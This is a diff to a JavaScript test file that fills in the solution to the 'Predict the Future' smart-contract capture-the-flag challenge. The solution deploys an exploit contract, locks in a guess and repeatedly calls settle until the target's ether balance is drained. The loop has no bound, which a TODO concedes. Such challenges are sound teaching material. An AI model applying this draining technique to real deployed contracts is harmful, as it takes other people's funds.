@@ -24,9 +24,20 @@ describe('PredictTheFutureChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const exploit = await (
+      await ethers.getContractFactory('PerdictTheFutureExploit', attacker)
+    ).deploy(target.address);
+    await exploit.deployed();
+
+    const lockInGuessTx = await exploit.lockInMyGuess(7, { value: utils.parseEther('1') });
+    await lockInGuessTx.wait();
+
+    // we try to settle until it's the correct guess
+    // TODO: add some safety guard to avoid infinite loop
+    while (!(await target.isComplete())) {
+      const settleTx = await exploit.tryToSettle();
+      await settleTx.wait();
+    }
 
     expect(await provider.getBalance(target.address)).to.equal(0);
     expect(await target.isComplete()).to.equal(true);
